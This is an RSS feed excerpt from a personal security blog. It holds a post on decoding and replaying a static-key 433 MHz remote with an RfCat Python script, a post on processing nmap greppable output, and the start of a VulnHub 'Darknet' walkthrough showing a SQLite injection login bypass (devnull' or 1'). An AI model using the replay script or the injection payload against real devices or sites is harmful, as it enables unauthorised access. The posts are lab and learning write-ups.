d.setMdmModulation(rflib.MOD_ASK_OOK)

d.makePktFLEN(12)    # Set the RFData packet length
d.setMdmDRate(3800)  # Set the Baud Rate
d.setMdmSyncMode(0)  # Disable preamble
d.setFreq(433920000) # Set the frequency

d.RFxmit(&#39;111001101101&#39;)
d.setModeIDLE()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran this script together with a gnuradio flow graph that was set up to dump the signal to a file. I then used this signal as a source to a &lt;em&gt;Scope Sink&lt;/em&gt; that was prefixed with a &lt;em&gt;Complex to Mag&lt;/em&gt; block. As expected, with this initial attempt I could not find anything in my graphs that even remotely looked like on-off keying!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_raw_binary_xmit.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;No easy win here was ok as it forced me to dive a little into the RFCat source code in an attempt to figure out how exactly the data should be sent. I also searched online for examples of how to send data correctly and came across a number of examples to help me.&lt;/p&gt;

&lt;p&gt;Turns out, I need to get my data into bytes to send with &lt;code&gt;RFxmit()&lt;/code&gt;. No big deal, lets do just that!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python

import rflib

data = &#39;111001101101&#39;

# Convert the data to hex
rf_data = hex(int(data, 2))

d = rflib.RfCat()

# Set Modulation. We using On-Off Keying here
d.setMdmModulation(rflib.MOD_ASK_OOK)

d.makePktFLEN(len(rf_data)) # Set the RFData packet length
d.setMdmDRate(3800)         # Set the Baud Rate
d.setMdmSyncMode(0)         # Disable preamble
d.setFreq(433920000)        # Set the frequency

# Send the data string a few times
d.RFxmit(rf_data, repeat=500)

d.setModeIDLE()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I now added the hex conversation of the original binary string and added the &lt;code&gt;repeat=500&lt;/code&gt; value to &lt;code&gt;RFxmit()&lt;/code&gt; to help me find the signal with gnuradio. This was finally what I needed to be able to send data that appeared to look like on-off keying!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_non_pwm_gnuradio.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This was not exactly the same as the signal that I originally captured using the actual remote, but, it was progress, and I believed it to be &lt;strong&gt;good&lt;/strong&gt; progress.&lt;/p&gt;

&lt;h2 id=&#34;getting-the-on-off-keying-right&#34;&gt;getting the on-off keying right&lt;/h2&gt;

&lt;p&gt;I played around quite a bit at this stage with my attempts to represent the same waveform as the ones captured from the remote I am trying to replicate. I made a major breakthrough when I came across this &lt;a href=&#34;http://adamsblog.aperturelabs.com/2013/03/you-can-ring-my-bell-adventures-in-sub.html&#34;&gt;blog post&lt;/a&gt; where the author explains a method in which to accurately convert the signal into a true on-off keying waveform. The general idea being that you should take note of the smallest distance of amplitude and use that as a single binary digit. You then count the bits relative to this distance and convert to them to a &lt;code&gt;1&lt;/code&gt; for a high amplitude and a &lt;code&gt;0&lt;/code&gt; for a low amplitude. Effectively we are simply calculating the Pulse-width Modulation key for our binary code manually now.&lt;/p&gt;

&lt;p&gt;So to replicate this in my example, I went back to the original wave file I recorded and extracted a single full pulse:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_full_zoom.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;One important difference that I noticed with my remote compared to many similar posts I saw online was that I had this long starting high amplitude before the actual on-off keying signal started. It looked like about half of a pulse was this high amplitude, and the other half signal. I assumed these will all just be handled by adding a bunch of &lt;code&gt;1&lt;/code&gt;&amp;rsquo;s in front of my final key as it may have served as some form of preamble or something. ¯\_(ツ)_/¯&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_full_zoom_pwm.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;If you look closely at the above image, you would notice that the second half of the pulse is divided up into equal length sections that are of similar size as that of the smallest pulse. This size can be seen as the &lt;a href=&#34;https://en.wikipedia.org/wiki/Clock_signal&#34;&gt;clock signal&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The distance of a high pulse followed by a low pulse (relative to the clock signal) signifies the bits that is being transferred. This is actually also known as &lt;a href=&#34;https://en.wikipedia.org/wiki/Pulse-width_modulation#Telecommunications&#34;&gt;Pulse-width Modulation&lt;/a&gt;. Applying this logic (as shown in the screenshot where the bits are filled in) to the waveform, we can deduce that the Pulse-width Modulation key (without the prefix of the 35 &lt;code&gt;1&lt;/code&gt;&amp;rsquo;s and the &lt;code&gt;0&lt;/code&gt;) is:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# PWM Key version of 111001101101
100100100110110100100110100100110100
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If we take an even closer look at the above PWM key, one might even notice that in relation to the waveform, the bit strings &lt;code&gt;1&lt;/code&gt;&amp;rsquo;s and &lt;code&gt;0&lt;/code&gt;&amp;rsquo;s are represented as &lt;code&gt;100&lt;/code&gt; for a &lt;code&gt;1&lt;/code&gt; and &lt;code&gt;110&lt;/code&gt; for a &lt;code&gt;0&lt;/code&gt; to form the full PWM key. We can visualize this logic in the below snippet where the PWM key is separated by a | and the original bitstring is filled in below it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# PWM to Bitstring comparison
100 | 100 | 100 | 110 | 110 | 100 | 100 | 110 | 100 | 100 | 110 | 100
 1     1     1     0     0     1     1     0     1     1     0     1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This matches our initial bit string of &lt;code&gt;111001101101&lt;/code&gt;, and helps us conclude that for a full PWM key (with the leading bunch of &lt;code&gt;1&lt;/code&gt;&amp;rsquo;s) the resultant key would be:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# Full PWM Key
111111111111111111111111111111111110100100100110110100100110100100110100
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;baud-rate-hate&#34;&gt;baud rate hate&lt;/h2&gt;

&lt;p&gt;Before I get to the rest of the newly updated script, lets talk about &lt;a href=&#34;https://en.wikipedia.org/wiki/Baud&#34;&gt;baud rate&lt;/a&gt; quickly. This is something that caused me &lt;strong&gt;a lot&lt;/strong&gt; of pain. I managed to get the original waveform from my remote and my generated waveform using scripts to look similar, but there was a serious issue with getting the length of the pulses to match. &lt;em&gt;If you look closely at the below screenshot you will notice there is actually a problem with the key too (missing a bit), but heh, the clock signal is whats important here:&lt;/em&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_baud_rate_miss.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This problem existed until I finally managed to figure out what the math for the baud rate calculation was. I noticed that this value is not an exact science though. You can be off by &lt;em&gt;quite a lot&lt;/em&gt;, and yet the signal will still have a high change of succeeding. YMMV.&lt;/p&gt;

&lt;p&gt;Unfortunately I can not remember the post / code that lead me to this, but the basic idea for calculating baud rate is as follows:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The source wave file would have been recorded at a certain &lt;em&gt;Sample Rate&lt;/em&gt;. We recorded at a sample rate of 2M from gnuradio.&lt;/li&gt;
&lt;li&gt;We want to figure out how many samples makes up the distance of the shortest high aptitude in the pulse (much like we needed for the PWM key calculation)&lt;/li&gt;
&lt;li&gt;The number of samples in the shortest high amplitude bit, divided by the sample rate over 1 should give you the baud rate.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In other words:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;baud = (1.0 / (length of shortest high peak / sample rate))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Practically, you can determine the values needed for the formula by opening a wave file you recorded using gnuradio, zooming and selecting one of the short pulses and changing the selection at the bottom dropdown to &lt;em&gt;length and samples&lt;/em&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_audacity_baud_rate.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here you can see my sample range for the shortest high peak is &lt;strong&gt;740&lt;/strong&gt; samples, and on the far left you can see the sample rate of &lt;strong&gt;2000000&lt;/strong&gt;. That means that my baud rate will be &lt;code&gt;1.0/(740/2000000)&lt;/code&gt;, which is ~&lt;strong&gt;2702&lt;/strong&gt; baud. Not 100% accurate, but accurate enough to work.&lt;/p&gt;

&lt;h2 id=&#34;let-there-be-light&#34;&gt;let there be light&lt;/h2&gt;

&lt;p&gt;One last hurdle! I had some troubles with the conversions to hex for the long bit string as a result of the PWM conversion. Thankfully, I came across the &lt;a href=&#34;https://pypi.python.org/pypi/bitstring/3.1.3&#34;&gt;bitstring&lt;/a&gt; module to handle the conversion to bytes. What a fantastic library :P&lt;/p&gt;

&lt;p&gt;The final, updated script follows:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python

# Send a PWM String using RfCat

import rflib
import bitstring

# That prefix string. This was determined by literally
# just looking at the waveform, and calculating it relative
# to the clock signal value.
# Your remote may not need this.
prefix = &#39;111111111111111111111111111111111110&#39;

# The key from our static key remote.
key = &#39;111001101101&#39;

# Convert the data to a PWM key by looping over the
# data string and replacing a 1 with 100 and a 0
# with 110
pwm_key = &#39;&#39;.join([&#39;100&#39; if b == &#39;1&#39; else &#39;110&#39; for b in key])

# Join the prefix and the data for the full pwm key
full_pwm = &#39;{}{}&#39;.format(prefix, pwm_key)
print(&#39;Sending full PWM key: {}&#39;.format(full_pwm))

# Convert the data to hex
rf_data = bitstring.BitArray(bin=full_pwm).tobytes()

# Start up RfCat
d = rflib.RfCat()

# Set Modulation. We using On-Off Keying here
d.setMdmModulation(rflib.MOD_ASK_OOK)

# Configure the radio
d.makePktFLEN(len(rf_data)) # Set the RFData packet length
d.setMdmDRate(2702)         # Set the Baud Rate
d.setMdmSyncMode(0)         # Disable preamble
d.setFreq(433920000)        # Set the frequency

# Send the data string a few times
d.RFxmit(rf_data, repeat=25)
d.setModeIDLE()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran this newly updated script and &lt;strong&gt;BAM&lt;/strong&gt;, my labs LED light illuminates! \o/&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_light_on.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;resources&#34;&gt;resources&lt;/h2&gt;

&lt;p&gt;Below is basically a link dump of stuff that was super helpful in getting as far as I did with this. These posts may help clear things up that made no sense in this post!&lt;/p&gt;

&lt;p&gt;General On-off keying stuff:&lt;br /&gt;
- &lt;a href=&#34;http://andrewmohawk.com/2012/09/06/hacking-fixed-key-remotes/&#34;&gt;http://andrewmohawk.com/2012/09/06/hacking-fixed-key-remotes/&lt;/a&gt;&lt;br /&gt;
- &lt;a href=&#34;https://zeta-two.com/radio/2015/06/23/ook-ask-sdr.html&#34;&gt;https://zeta-two.com/radio/2015/06/23/ook-ask-sdr.html&lt;/a&gt;&lt;br /&gt;
- &lt;a href=&#34;http://www.rtl-sdr.com/using-a-yardstick-one-hackrf-and-inspectrum-to-decode-and-duplicate-an-ook-signal/&#34;&gt;http://www.rtl-sdr.com/using-a-yardstick-one-hackrf-and-inspectrum-to-decode-and-duplicate-an-ook-signal/&lt;/a&gt;&lt;br /&gt;
- &lt;a href=&#34;https://blog.compass-security.com/2016/09/software-defied-radio-sdr-and-decoding-on-off-keying-ook/&#34;&gt;https://blog.compass-security.com/2016/09/software-defied-radio-sdr-and-decoding-on-off-keying-ook/&lt;/a&gt;&lt;br /&gt;
- &lt;a href=&#34;http://leetupload.com/blagosphere/index.php/2014/02/24/non-return-to-zero-askook-signal-replay/&#34;&gt;http://leetupload.com/blagosphere/index.php/2014/02/24/non-return-to-zero-askook-signal-replay/&lt;/a&gt;&lt;br /&gt;
- &lt;a href=&#34;http://adamsblog.aperturelabs.com/2013/03/you-can-ring-my-bell-adventures-in-sub.html&#34;&gt;http://adamsblog.aperturelabs.com/2013/03/you-can-ring-my-bell-adventures-in-sub.html&lt;/a&gt;&lt;br /&gt;
- &lt;a href=&#34;http://dani.foroselectronica.es/rfcat-ti-chronos-and-replaying-rf-signals-337/&#34;&gt;http://dani.foroselectronica.es/rfcat-ti-chronos-and-replaying-rf-signals-337/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sample code:&lt;br /&gt;
- &lt;a href=&#34;https://github.com/AndrewMohawk/RfCatHelpers&#34;&gt;https://github.com/AndrewMohawk/RfCatHelpers&lt;/a&gt;&lt;br /&gt;
- &lt;a href=&#34;https://github.com/ade-ma/LibOut/blob/master/scripts/rfcat-libout.py&#34;&gt;https://github.com/ade-ma/LibOut/blob/master/scripts/rfcat-libout.py&lt;/a&gt;&lt;br /&gt;
- &lt;a href=&#34;https://github.com/alextspy/rolljam/blob/master/rf_car_jam.py&#34;&gt;https://github.com/alextspy/rolljam/blob/master/rf_car_jam.py&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;further-work&#34;&gt;further work&lt;/h2&gt;

&lt;p&gt;With that done, I set off to write a toolkit that allows you to work with rfcat and On-off keying data sources such as wave files, or just simple recordings from rfcat itself. After finishing the polishing, I&amp;rsquo;ll release it along with a post detailing its internals and usage! In the meantime, keep an eye on this repository &lt;a href=&#34;https://github.com/leonjza/ooktools&#34;&gt;https://github.com/leonjza/ooktools&lt;/a&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_ooktools.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Happy hacking!&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>awesome nmap grep</title>
      <link>https://leonjza.github.io/blog/2016/07/09/awesome-nmap-grep/</link>
      <pubDate>Sat, 09 Jul 2016 15:55:48 +0200</pubDate>
      
      <guid>https://leonjza.github.io/blog/2016/07/09/awesome-nmap-grep/</guid>
      <description>&lt;p&gt;Nmap&amp;rsquo;s greppable output is really handy. Saving greppable output from a scan means the output is delimited in a way that can be easily processed using tools such as &lt;code&gt;grep&lt;/code&gt;, &lt;code&gt;sed&lt;/code&gt;, &lt;code&gt;cut&lt;/code&gt; and &lt;code&gt;awk&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nmap-project-logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This post shows a few examples of post scan processing of the greppable output produced with the &lt;code&gt;-oG&lt;/code&gt; flag. A more up to date repository with examples and command explanations can be found in my &lt;a href=&#34;https://github.com/leonjza/awesome-nmap-grep&#34;&gt;awesome-nmap-grep&lt;/a&gt; github repository.
&lt;/p&gt;

&lt;h2 id=&#34;keep-in-mind&#34;&gt;keep in mind&lt;/h2&gt;

&lt;p&gt;All of the below commands assume an environment variable &lt;code&gt;NMAP_FILE&lt;/code&gt; is set. This is simply the location of the output from nmaps &lt;code&gt;-oG&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;count-number-of-open-ports&#34;&gt;Count Number of Open Ports&lt;/h3&gt;

&lt;h4 id=&#34;command&#34;&gt;command&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;NMAP_FILE=output.grep

egrep -v &amp;quot;^#|Status: Up&amp;quot; $NMAP_FILE | cut -d&#39; &#39; -f2 -f4- | \
sed -n -e &#39;s/Ignored.*//p&#39; | \
awk -F, &#39;{split($0,a,&amp;quot; &amp;quot;); printf &amp;quot;Host: %-20s Ports Open: %d\n&amp;quot; , a[1], NF}&#39; \
| sort -k 5 -g
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;output&#34;&gt;output&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Host: 127.0.0.1            Ports Open: 16
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;top-10-open-ports&#34;&gt;Top 10 Open Ports&lt;/h3&gt;

&lt;h4 id=&#34;command-1&#34;&gt;command&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;NMAP_FILE=output.grep

egrep -v &amp;quot;^#|Status: Up&amp;quot; $NMAP_FILE | cut -d&#39; &#39; -f4- | \
sed -n -e &#39;s/Ignored.*//p&#39; | tr &#39;,&#39; &#39;\n&#39; | sed -e &#39;s/^[ \t]*//&#39; | \
sort -n | uniq -c | sort -k 1 -r | head -n 10
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;output-1&#34;&gt;output&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;1 9001/open/tcp//tor-orport?///
1 9000/open/tcp//cslistener?///
1 8080/open/tcp//http-proxy///
1 80/open/tcp//http//Caddy/
1 6379/open/tcp//redis//Redis key-value store/
1 631/open/tcp//ipp//CUPS 2.1/
1 6234/open/tcp/////
1 58377/filtered/tcp/////
1 53/open/tcp//domain//dnsmasq 2.76/
1 49153/open/tcp//mountd//1-3/
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;hosts-and-open-ports&#34;&gt;Hosts and Open Ports&lt;/h3&gt;

&lt;h4 id=&#34;command-2&#34;&gt;command&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;NMAP_FILE=output.grep

egrep -v &amp;quot;^#|Status: Up&amp;quot; $NMAP_FILE | cut -d&#39; &#39; -f2 -f4- | \
sed -n -e &#39;s/Ignored.*//p&#39;  | \
awk &#39;{print &amp;quot;Host: &amp;quot; $1 &amp;quot; Ports: &amp;quot; NF-1; $1=&amp;quot;&amp;quot;; for(i=2; i&amp;lt;=NF; i++) { a=a&amp;quot; &amp;quot;$i; }; split(a,s,&amp;quot;,&amp;quot;); for(e in s) { split(s[e],v,&amp;quot;/&amp;quot;); printf &amp;quot;%-8s %s/%-7s %s\n&amp;quot; , v[2], v[3], v[1], v[5]}; a=&amp;quot;&amp;quot; }&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;output-2&#34;&gt;output&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Host: 127.0.0.1 Ports: 16
open     tcp/22    ssh
open     tcp/53    domain
open     tcp/80    http
open     tcp/443   https
open     tcp/631   ipp
open     tcp/3306  mysql
open     tcp/4767  unknown
open     tcp/6379
open     tcp/8080  http-proxy
open     tcp/8081  blackice-icecap
open     tcp/9000  cslistener
open     tcp/9001  tor-orport
open     tcp/49152 unknown
open     tcp/49153 unknown
filtered tcp/54695
filtered tcp/58369
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As mentioned in the beginning, more up to date examples are available in the &lt;a href=&#34;https://github.com/leonjza/awesome-nmap-grep&#34;&gt;awesome-nmap-grep&lt;/a&gt; github repository.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>rooting darknet</title>
      <link>https://leonjza.github.io/blog/2016/06/16/rooting-darknet/</link>
      <pubDate>Thu, 16 Jun 2016 21:54:55 +0200</pubDate>
      
      <guid>https://leonjza.github.io/blog/2016/06/16/rooting-darknet/</guid>
      <description>&lt;p&gt;Its been a while since I have done a vulnerable boot2root from &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;. So, I decided to pick up where I last left. After paging back from the latest VM&amp;rsquo;s to where I roughly stopped last year, my attention was drawn to &lt;a href=&#34;https://www.vulnhub.com/entry/darknet-10,120/&#34;&gt;Darknet&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/Q3rv0&#34;&gt;@Q3rv0&lt;/a&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.
&lt;/p&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;Starting with these VM&amp;rsquo;s is almost always the same story and Darknet was no different. Pick up the VM&amp;rsquo;s IP address (yes, I still use the VMWare network sniffer &lt;code&gt;sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer -e vmnet8&lt;/code&gt;). &lt;strong&gt;192.168.252.140&lt;/strong&gt;. On to the &lt;code&gt;nmap&lt;/code&gt;!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -v --reason 192.168.252.140 -sV

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-16 20:13 UTC

[...]

Reason: 998 resets
PORT    STATE SERVICE REASON         VERSION
80/tcp  open  http    syn-ack ttl 37 Apache httpd 2.2.22 ((Debian))
111/tcp open  rpcbind syn-ack ttl 37 2-4 (RPC #100000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just &lt;code&gt;tcp/80&lt;/code&gt; to work with really. &lt;code&gt;tcp/111&lt;/code&gt; did not yield anything interesting at first glance, but the most obvious next step was definitely the web port.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_homepage.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;888-darknet-com&#34;&gt;888.darknet.com&lt;/h2&gt;

&lt;p&gt;The homepage on the web server I have found so far was not very interesting. I scanned it with &lt;code&gt;gobuster&lt;/code&gt; hoping to discover some more directories which revealed the existence of an &lt;code&gt;/access&lt;/code&gt; folder.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster -u http://192.168.252.140/ -w /usr/share/wordlists/wfuzz/general/common.txt

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.252.140/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/access (Status: 301)
/index (Status: 200)
=====================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Browsing to &lt;a href=&#34;http://192.168.252.140/access/&#34;&gt;http://192.168.252.140/access/&lt;/a&gt; showed that directory indexing was enabled and revealed the &lt;code&gt;888.darknet.com.backup&lt;/code&gt; file.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_access_folder.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Downloading and inspecting the file, it quickly became apparent that this looked like an &lt;a href=&#34;https://httpd.apache.org/docs/current/vhosts/examples.html&#34;&gt;Apache Virtual Host&lt;/a&gt; configuration.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# cat 888.darknet.com.backup
&amp;lt;VirtualHost *:80&amp;gt;
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&amp;lt;/VirtualHost&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I took this as a hint that I would have to hack an entry into my local &lt;code&gt;/etc/hosts&lt;/code&gt; to resolve &lt;em&gt;888.darknet.com&lt;/em&gt; to &lt;em&gt;192.168.252.140&lt;/em&gt;. After having done that, we are presented with yet another page with a login.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_login.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;888-authentication-bypass&#34;&gt;888 authentication bypass&lt;/h2&gt;

&lt;p&gt;Natural instinct has it that when you see login pages like these, you just throw some single quotes at the fields to see what happens. I did exactly this and was pleasantly met with an error response along the lines of &lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;. This just &lt;strong&gt;screamed&lt;/strong&gt; SQL injection! I figured since it seems to be reflecting errors back at the page, &lt;code&gt;sqlmap&lt;/code&gt; might just quickly sort out this stage for us without much effort. &lt;strong&gt;Nope!&lt;/strong&gt; After quite a bit of time, I learnt that the SQL injection only appears to be in the &lt;code&gt;username&lt;/code&gt; field, but no matter how I tried to get &lt;code&gt;sqlmap&lt;/code&gt; to play along, I was inevitably met with &lt;code&gt;[WARNING] POST parameter &#39;username&#39; is not injectable&lt;/code&gt; every time.&lt;/p&gt;

&lt;p&gt;Admitting defeat, I figured I should stop being lazy and attempt the injection manually. The fact that the error message returned &lt;code&gt;unrecognized token&lt;/code&gt; hinted towards the idea that the backend database might be SQLite. This gives me a frame of reference for the SQL dialect to use. Next, the most critical step for the injection to be successful was to try and envision what the query must look like in the backend. I played around quite a bit more, and got he most information out of the error message when I have the value &lt;code&gt;&#39;&amp;quot;1&lt;/code&gt; as a username and any text as a password.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_login_error.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Great. So with &lt;code&gt;&amp;quot;&amp;quot;1&#39; and pass=&#39;03c7c0ace395d80182db07ae2c30f034&#39;&amp;quot;&lt;/code&gt; as the error message, I theorized that the SQL query might be something along the lines of:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;&amp;lt;INJECT&amp;gt;&#39; and pass=&#39;&amp;lt;MD5 OF PASS&amp;gt;&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the softwares logic then, there may be a requirement to just have a row return to mark the session as logged in. Makes sense right? :) So, in order to attempt an authentication bypass, I will need to try and get the query manipulated in such a way that the query will return a valid row regardless of the password. In SQL, we can have something like &lt;code&gt;SELECT 1&lt;/code&gt; which will just return &lt;code&gt;1&lt;/code&gt; in the row set.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# sqlite3
SQLite version 3.8.10.2 2015-05-20 18:17:19
Enter &amp;quot;.help&amp;quot; for usage hints.
Connected to a transient in-memory database.
Use &amp;quot;.open FILENAME&amp;quot; to reopen on a persistent database.
sqlite&amp;gt; SELECT 1;
1
sqlite&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this knowledge, we can imagine that we could have the final query the software will execute look something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;a user&#39; or &#39;1&#39; and pass=&#39;&amp;lt;MD5 OF PASS&amp;gt;&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In other words, if the injection point is in the &lt;code&gt;user&lt;/code&gt; section, the payload we need to execute may be derived as follows:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;&lt;/code&gt; &lt;strong&gt;a user&amp;rsquo; or &amp;lsquo;1&lt;/strong&gt; &lt;code&gt;&#39; and pass=&#39;&amp;lt;MD5 OF PASS&amp;gt;&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This obviously begs the requirement to have knowledge of a valid user! Well, remember that Apache Virtual host config file? It mentioned that the server admin is &lt;code&gt;devnull@darknet.com&lt;/code&gt;. Admittedly, this took me a while to get to (and maybe a bit of a cheat :P), but using a username of &lt;code&gt;devnull&lt;/code&gt; will complete the requirements we have to bypass the authentication needed for this page.&lt;/p&gt;

&lt;p&gt;Considering the injection point and theorized query, we can use a username of &lt;code&gt;devnull&#39; or 1&#39;&lt;/code&gt; and any password to login.&lt;/p&gt;

&lt;h2 id=&#34;administrator-sql-shell&#34;&gt;administrator sql shell&lt;/h2&gt;

&lt;p&gt;After the login bypass, I was presented with a page titled &lt;strong&gt;Administrador SQL&lt;/strong&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_administrator_sql.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I tried a few queries but quickly realized that no output was returned no matter what you gave it.&lt;/p&gt;

&lt;p&gt;While researching some of the possibilities with SQLite injection, I came across &lt;a href=&#34;http://gwae.trollab.org/sqlite-injection.html&#34;&gt;this&lt;/a&gt; blogpost that details a method of writing arbitrary code to a file of our choosing (obviously assuming we have write access there). Considering I had a fictitious &lt;em&gt;SQL shell&lt;/em&gt; now, I jumped right into trying this.&lt;/p&gt;

&lt;p&gt;The first thing I needed to do though was to find a writable directory. The blogpost mentions that &lt;code&gt;uploads/&lt;/code&gt; and &lt;code&gt;cache/&lt;/code&gt; are usually good candidates (and rightfully so), but it did not seem like the paths existed at &lt;a href=&#34;http://888.darknet.com/uploads/&#34;&gt;http://888.darknet.com/uploads/&lt;/a&gt; and &lt;a href=&#34;http://888.darknet.com/cache/&#34;&gt;http://888.darknet.com/cache/&lt;/a&gt;. So I pulled up &lt;code&gt;gobuster&lt;/code&gt; again to see if there are any other directories I could potentially use for this.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# gobuster -u http://888.darknet.com/ -w /usr/share/wordlists/wfuzz/general/common.txt

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://888.darknet.com/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/css (Status: 301)
/img (Status: 301)
/includes (Status: 301)
=====================================================
&lt;/code&gt;&lt;/pre&gt;

